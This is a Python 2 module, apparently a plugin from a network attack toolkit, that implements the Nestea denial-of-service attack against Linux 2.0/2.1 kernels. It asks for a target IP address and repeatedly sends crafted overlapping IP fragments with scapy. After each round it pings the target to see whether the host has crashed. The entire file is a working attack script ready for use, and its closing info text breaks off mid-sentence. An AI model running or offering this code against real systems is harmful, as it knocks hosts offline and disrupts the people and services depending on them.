import commands, re
from util import Msg, Error
from os import system
from scapy.all import *

#
# Linux-equivalent to the Teardrop DoS, works on 2.0 and 2.1.
# Attack works by sending fragmented datagram pairs to a host.  The first host begins at offset 0 (first packet),
# with a payload of N.  The following packet is set to overlap within the previous fragment.  This causes a crash
# within the 2.0/2.1 kernel. 
#
def initialize():
	# shut scapy up
	conf.verb = 0

	try:
		ip = raw_input('[!] Enter IP address to DoS: ')
		tmp = raw_input('[!] Nestea DoS IP %s.  Is this correct? '%ip)
		if tmp == 'n':
			return
		while True:
			print '[!] DoSing %s...'%ip
			send(IP(dst=ip, id=42, flags="MF")/UDP()/("X"*10))
			send(IP(dst=ip, id=42, frag=48)/("X"*116))
			send(IP(dst=ip, id=42, flags="MF")/UDP()/("X"*224))
			print '[!] Checking target...'
			rval = commands.getoutput('ping -c 1 -w 1 %s'%ip)
			up = re.search("\d.*? received", rval)
			if re.search("0", up.group(0)) is None:
				Msg('Host appears to still be up.')
				try:
					tmp = raw_input('[!] Try again? ')
				except Exception:
					break
				if tmp == 'n':
					break
			else:
				Msg('Host not responding!')
				break
	except Exception, j:
		Error('Error with given address.  Could not complete DoS.')
		return
	
def info():
	print '''\n\t[!] NESTEA DOS ATTACK
		  [systems]: Linux 2.0
					 Linux 2.1
		  [info]:    Nestea DoS is the Linux equivalent to '''
	
